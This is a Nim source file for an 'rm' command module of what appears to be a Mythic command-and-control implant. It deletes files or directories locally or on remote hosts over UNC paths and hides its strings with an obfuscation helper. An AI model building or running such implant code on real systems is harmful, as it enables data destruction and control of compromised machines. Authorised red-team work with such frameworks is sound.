import std/[json, os, strformat, strutils]
import ../utils/mythic_responses
import ../utils/debug
import ../utils/strenc

proc rm*(taskId: string, params: JsonNode): JsonNode =
  ## Remove (delete) a file or directory
  try:
    # Parse parameters
    let pathParam = params[obf("path")].getStr()
    let host = if params.hasKey(obf("host")): params[obf("host")].getStr() else: ""
    
    # Build UNC path if host is provided
    let path = if host.len > 0:
      # Remove leading/trailing backslashes from path
      let cleanPath = pathParam.strip(chars = {'\\', '/'})
      # Build UNC path: \\host\share
      "\\\\" & host & "\\" & cleanPath
    elif pathParam.startsWith("\\\\") or isAbsolute(pathParam):
      pathParam
    else:
      getCurrentDir() / pathParam
    
    debug &"[DEBUG] Removing: {path}"
    
    # Check if path exists
    if not fileExists(path) and not dirExists(path):
      return mythicError(taskId, obf("Path does not exist: ") & path)
    
    # Determine if it's a file or directory
    if fileExists(path):
      removeFile(path)
      return mythicSuccess(taskId, obf("Successfully removed file: ") & path)
    elif dirExists(path):
      removeDir(path)
      return mythicSuccess(taskId, obf("Successfully removed directory: ") & path)
    else:
      return mythicError(taskId, obf("Error: Unknown path type: ") & path)
      
  except OSError as e:
    return mythicError(taskId, obf("Error removing path: ") & e.msg)
  except:
    let e = getCurrentException()
    return mythicError(taskId, obf("Error: ") & e.msg)